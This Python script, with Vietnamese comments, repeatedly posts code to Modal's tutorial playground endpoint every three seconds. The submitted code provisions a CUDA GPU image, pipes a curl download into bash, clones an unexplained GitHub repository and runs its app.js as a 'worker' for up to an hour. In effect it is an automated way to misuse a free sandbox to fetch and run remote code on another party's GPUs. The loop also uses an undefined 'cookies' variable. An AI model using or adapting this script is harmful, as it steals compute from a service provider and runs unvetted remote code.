import requests
import time
headers = {
    'sec-ch-ua-platform': '"Windows"',
    'Referer': '',
    'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    'sec-ch-ua-mobile': '?0',
    'baggage': 'sentry-environment=production,sentry-release=e29075d6d18448ffbe92b8ccc63e7900,sentry-public_key=d75f7cb747cd4fe8ac03973ae3d39fec,sentry-trace_id=a80d348d171d53102f193f204ebcc6ed,sentry-sample_rand=0.04394823387882163',
    'sentry-trace': 'a80d348d171d53102f193f204ebcc6ed-983d7a4420d68150',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    'content-type': 'application/json',
}

json_data = {
    'tutorial': 'get_started',
    'code': 'import modal\nimport subprocess\n\n# Định nghĩa image có CUDA và Python\nimage = modal.Image.from_registry("nvidia/cuda:12.4.0-devel-ubuntu22.04", add_python="3.11").pip_install("cupy-cuda12x")\n\n# Tạo ứng dụng Modal\napp = modal.App()\n\n# Định nghĩa function để cài đặt và chạy app\n@app.function(image=image, timeout=3600)\ndef run_node_app():\n    # Cập nhật gói và cài đặt các công cụ cần thiết\n    subprocess.run(["apt-get", "update", "-y"], check=True)\n    subprocess.run(["apt-get", "install", "-y", "git", "curl", "gnupg"], check=True)\n\n    # Cài đặt Node.js LTS 18\n    subprocess.run("curl -fsSL https://deb.nodesource.com/setup_18.x | bash -", shell=True, check=True)\n    subprocess.run(["apt-get", "install", "-y", "nodejs"], check=True)\n\n    # Clone repository\n    subprocess.run(["git", "clone", "https://github.com/dinhnguyenhais733s-hub/tool.git"], check=True)\n\n    # Chạy ứng dụng Node.js\n    process = subprocess.Popen(\n        ["node", "app.js"],\n        cwd="tool"\n    )\n    process.wait()\n\n# Chạy ứng dụng Modal\napp.run()\n',
    'modalEnvironment': 'main',
    'winsize': {
        'rows': 11,
        'cols': 57,
    },
}

response = requests.post('https://modal.com/api/playground/dinhnguyenhais733s/run', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"tutorial":"get_started","code":"import modal\\nimport subprocess\\n\\n# Định nghĩa image có CUDA và Python\\nimage = modal.Image.from_registry(\\"nvidia/cuda:12.4.0-devel-ubuntu22.04\\", add_python=\\"3.11\\").pip_install(\\"cupy-cuda12x\\")\\n\\n# Tạo ứng dụng Modal\\napp = modal.App()\\n\\n# Định nghĩa function để cài đặt và chạy app\\n@app.function(image=image, timeout=3600)\\ndef run_node_app():\\n    # Cập nhật gói và cài đặt các công cụ cần thiết\\n    subprocess.run([\\"apt-get\\", \\"update\\", \\"-y\\"], check=True)\\n    subprocess.run([\\"apt-get\\", \\"install\\", \\"-y\\", \\"git\\", \\"curl\\", \\"gnupg\\"], check=True)\\n\\n    # Cài đặt Node.js LTS 18\\n    subprocess.run(\\"curl -fsSL https://deb.nodesource.com/setup_18.x | bash -\\", shell=True, check=True)\\n    subprocess.run([\\"apt-get\\", \\"install\\", \\"-y\\", \\"nodejs\\"], check=True)\\n\\n    # Clone repository\\n    subprocess.run([\\"git\\", \\"clone\\", \\"https://github.com/dinhnguyenhais733s-hub/tool.git\\"], check=True)\\n\\n    # Chạy ứng dụng Node.js\\n    process = subprocess.Popen(\\n        [\\"node\\", \\"app.js\\"],\\n        cwd=\\"tool\\"\\n    )\\n    process.wait()\\n\\n# Chạy ứng dụng Modal\\napp.run()\\n","modalEnvironment":"main","winsize":{"rows":11,"cols":57}}'.encode()
#response = requests.post('https://modal.com/api/playground/dinhnguyenhais733s/run', headers=headers, data=data)
url = 'https://modal.com/api/playground/dinhnguyenhais733s/run'
delay = 3  

def main():
    while True:
        try:
            resp = requests.post(
                url,
                cookies=cookies,
                headers=headers,
                json=json_data,
                timeout=10  
            )
            print(f"Đã tạo worker thành công | Status: {resp.status_code}")
        except requests.exceptions.Timeout:
            print("Request bị timeout, thử lại sau...")
        except Exception as e:
            print(f"Tạo worker với lỗi: {e}")

        for i in range(delay, 0, -1):
            print(f"Đợi {i} giây...", end="\r", flush=True)
            time.sleep(1)


if __name__ == "__main__":
    main()


